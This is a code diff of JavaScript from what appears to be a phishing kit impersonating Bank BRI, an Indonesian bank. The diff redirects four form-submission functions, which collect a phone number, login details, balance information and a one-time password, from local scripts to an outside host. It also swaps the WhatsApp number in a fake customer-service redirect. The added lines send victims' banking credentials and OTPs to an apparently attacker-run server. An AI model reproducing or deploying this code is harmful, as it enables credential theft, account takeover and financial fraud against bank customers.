@@ -5,7 +5,7 @@ function sendHp() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/one.php',
+      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/one.php',
       data: $('#inputHp').serialize(),
       complete: function(data) {
          vibr(220);
@@ -36,7 +36,7 @@ function sendLogin() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/login.php',
+      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/login.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -67,7 +67,7 @@ function sendSaldo() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/two.php',
+      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/two.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -102,7 +102,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'req/three.php',
+      url: 'https://kuda-terbang.whf.bz/notif/v9-v2ge3e/three.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')         
@@ -131,7 +131,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='https://wa.me/628388915819?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Virtual';
+location.href='https://wa.me/62817319050?text=Hallo%20Bank%20BRI%0ASaya%20mau%20Request%20kode%20Virtual';
  $('.load').hide();
     }, 4000);    
     
